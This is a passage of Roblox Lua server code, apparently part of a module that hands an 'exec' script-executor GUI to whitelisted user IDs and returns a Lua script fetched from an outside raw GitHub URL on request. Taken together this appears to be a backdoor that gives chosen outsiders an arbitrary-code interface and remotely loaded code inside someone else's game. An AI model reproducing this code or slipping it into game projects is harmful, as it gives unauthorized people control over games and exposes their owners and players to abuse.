		game:GetService("ReplicatedStorage"):FindFirstChild("initclient"):FireClient(player, exec, execute2, main, title, buttons, execute, shadow, clear, scriptlist, settingz, exec_2, scripteditor, scriptbox, otherscripts, TextLabel, settings_2, TextLabel_2)
	elseif player:FindFirstChild("PlayerGui"):FindFirstChild("exec") and table.find(module.whitelist, player.UserId) then
		player.PlayerGui:FindFirstChild("exec"):Destroy()
	end
end

game:GetService("ReplicatedStorage").givegui.OnServerEvent:Connect(function(player)
    module:givegui(player)
end)

game:GetService("ReplicatedStorage"):WaitForChild("gethttp").OnServerInvoke = function(plr)
	if table.find(module.whitelist, plr.UserId) then
		return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/main/l.lua", true)
	end
end

return module
